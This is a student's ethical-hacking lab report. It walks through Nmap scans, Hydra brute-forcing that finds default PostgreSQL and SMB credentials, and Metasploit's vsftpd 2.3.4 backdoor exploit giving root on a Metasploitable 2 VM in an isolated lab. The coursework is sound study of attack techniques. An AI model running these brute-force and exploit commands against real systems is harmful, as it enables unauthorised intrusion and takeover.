# Ethical Hacking ELC 2526EVENSEM

## Student Details

```txt
Satyam Tiwari
1024030088
```

## Setup

|         | Kali Linux            | Metasploitable 2      |
| ------- | --------------------- | --------------------- |
| RAM     | 4096 MB               | 512 MB                |
| CPUs    | 2                     | 1                     |
| Disk    | 25 GB VDI             | 8 GB VMDK             |
| Network | Host-only (allow-all) | Host-only (allow-all) |
| IP      | 192.168.56.101        | 192.168.56.103        |
| Role    | Attacker              | Victim                |

## Tools Used

- Hydra
- Nmap
- Metasploit

## Task 1: Reconnaissance and Service Auditing

### 1.1 Host Discovery

To initiate the security assessment, I verified the network interfaces and confirmed connectivity between my Kali Linux attacker machine and the Metasploitable 2 target VM over the isolated virtual Host-Only network adapter.

Running `ifconfig` on the target machine provided the baseline network metrics:

- **Target IP Address:** 192.168.56.103
- **Subnet Mask:** 255.255.255.0 (/24)
- **Hardware MAC Address:** 08:00:27:ab:43:06
- **Attacker (Kali Linux) IP:** 192.168.56.101

I executed an initial network ping sweep using Nmap across the subnet range to confirm the target host was active and responding to ICMP/ARP traffic without launching a loud port scan.

```bash
nmap -sn 192.168.56.0/24
```

**Command Flag Breakdown:**

- `-sn`: Disables the default port scanning phase (Ping Scan). This restricts Nmap to host discovery only, verifying if a machine is online.
- `192.168.56.0/24`: Targets the full local Class-C network block.

**Scan Output:**

```text
Nmap scan report for 192.168.56.103
Host is up (0.0021s latency).
MAC Address: 08:00:27:AB:43:06 (Oracle VirtualBox virtual NIC)
```

The scan confirmed that the target at `192.168.56.103` was active, routing properly, and ready for further service analysis.

---

### 1.2 Service Enumeration and Version Tracking

With the target confirmed active, I performed a targeted Nmap service version scan against the ports specified in the lab requirements to identify open entry points and the underlying software daemons.

```bash
nmap -p 23,25,445,3389,5432,5900 -sV 192.168.56.103
```

**Command Flag Breakdown:**

- `-p 23,25,445,3389,5432,5900`: Limits the scan to the required ports (Telnet, SMTP, SMB, RDP, PostgreSQL, and VNC).
- `-sV`: Enables service version detection, prompting Nmap to banner-grab and interrogate the open ports for application version data.

**Scan Results:**
The scan completed in 6.50 seconds and mapped out the following network attack surface:

| Port | State | Service | Version Details |
| --- | --- | --- | --- |
| 23/tcp | open | telnet | Linux telnetd (Unencrypted remote administration) |
| 25/tcp | open | smtp | Postfix smtpd (Mail delivery engine) |
| 445/tcp | open | netbios-ssn | Samba smbd 3.X - 4.X (Workgroup: WORKGROUP) |
| 3389/tcp | closed | ms-wbt-server | Closed (RDP is a native Windows service; target runs Linux) |
| 5432/tcp | open | postgresql | PostgreSQL DB 8.3.0 - 8.3.7 |
| 5900/tcp | open | vnc | VNC (Protocol 3.3 desktop sharing) |

---

### 1.3 Automated Credential Auditing with Hydra

I used THC-Hydra alongside the standard `fasttrack.txt` wordlist to audit the open services for weak, default, or unconfigured credential sets.

#### 1. PostgreSQL Database Audit (Port 5432)

I targeted the default administrative database username `postgres` using the following command loop:

```bash
hydra -l postgres -P /usr/share/wordlists/fasttrack.txt -t 10 192.168.56.103 postgres
```

**Result:**
Hydra identified a critical default credential vulnerability almost immediately:

```text
[5432][postgresql] host: 192.168.56.103   login: postgres   password: postgres
1 of 1 target successfully completed, 1 valid password found
```

#### 2. Samba NetBIOS Audit (Port 445)

Next, I checked the generic system service account user `user`. To ensure the Samba daemon didn't drop connection packets under load, I throttled the attack speed down to a single thread (`-t 1`):

```bash
hydra -l user -P /usr/share/wordlists/fasttrack.txt -t 1 192.168.56.103 smb
```

**Result:**
The service successfully matched another weak, identical credential pair:

```text
[445][smb] host: 192.168.56.103   login: user   password: user
1 of 1 target successfully completed, 1 valid password found
```

#### 3. Technical Constraints and Non-Vulnerable Protocols

During the credential audit phase, several services did not yield direct access due to specific environment configurations:

- **Telnet (Port 23):** I ran an automated brute-force attack against the default `msfadmin` account. The dictionary attack cycled through without crashing but returned `0 valid passwords found`, showing that this user profile has a modified password not present in the quick-pacing `fasttrack.txt` file.
- **SMTP (Port 25):** The mail daemon immediately closed the authentication request loop with an error string: `503 5.5.1 Error: authentication not enabled`. This indicates that the server handles anonymous mail relays internally but has SASL/SMTP login extensions disabled entirely.
- **VNC (Port 5900):** Probing the graphical interface threw a security mismatch error sequence (`unknown VNC server security result 2`) followed by a terminal drop: `VNC server told us to quit`. The legacy VNC engine dropped the multi-threaded connections to prevent brute-force exhaustion.

---

## Task 2: Framework Exploitation & Reverse Shell Capture

For the second task, I leveraged the Metasploit Framework to move from credential auditing into active service exploitation. I targeted the unencrypted File Transfer Protocol service to achieve remote command execution.

### 2.1 vsFTPd 2.3.4 Upstream Backdoor Compromise (Port 21)

The validation targeted the FTP daemon on Port 21. This specific version contains a historic software supply-chain backdoor. Providing a login username containing a smiley face sequence (`:)`) triggers a hidden, unauthenticated listener socket on target port 6200.

#### 1. Scanning and Version Verification

I ran a targeted check to guarantee the FTP version banner matched the vulnerable footprint perfectly:

```bash
nmap -p 21 -sV 192.168.56.103
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsFTPd 2.3.4
```

#### 2. Module Orchestration and Target Setup

I opened `msfconsole` and loaded the vsFTPd backdoor exploit module. I configured the target host IP and explicitly set the listener port to `6666` to intercept the callback cleanly:

```msf
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.103
set LHOST 192.168.56.101
set LPORT 6666
```

Running `show options` confirmed the parameters were committed properly into memory:

```text
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.56.103   yes       The target host(s)
   RPORT   21               yes       The target port (TCP)
```

#### 3. Exploitation and Meterpreter Upgrade

I executed the exploit using the `exploit` command. The module automatically passed the backdoor token string to port 21, forced the target to fork the listener on port 6200, and upgraded the raw shell interface into a structured **Meterpreter session**:

```text
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.56.101:6666 
[*] 192.168.56.103:21 - Backdoor has been spawned!
[*] Meterpreter session 3 opened (192.168.56.101:6666 -> 192.168.56.103:57199) at 2026-06-08 11:41:36 -0400
```

#### 4. Post-Exploitation Verification via Meterpreter API

To inspect target properties and complete the lab requirements, I called the native API tools instead:

```meterpreter
getuid
```

```text
Server username: root
```

The output verified that the service exploitation bypassed standard access layers to grant the highest level of administrative context (**root**). Next, I queried the full base folder tree using Meterpreter's native `ls` command to prove read capabilities over the compromised machine:

```meterpreter
ls
```

```text
Listing: /
===================
Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100700/rwx------  1188612   fil   2026-06-08 10:21:23 -0400  IJwVaGTqj
040755/rwxr-xr-x  4096      dir   2012-05-13 23:35:33 -0400  bin
040755/rwxr-xr-x  1024      dir   2012-05-13 23:36:28 -0400  boot
040755/rwxr-xr-x  4096      dir   2010-03-16 18:55:52 -0400  cdrom
040755/rwxr-xr-x  13480     dir   2026-06-08 09:43:14 -0400  dev
040755/rwxr-xr-x  4096      dir   2026-06-08 09:43:22 -0400  etc
040755/rwxr-xr-x  4096      dir   2010-04-16 02:16:02 -0400  home
```

The file tree reflects full interaction capabilities across the core system storage layout, verifying full system takeover.
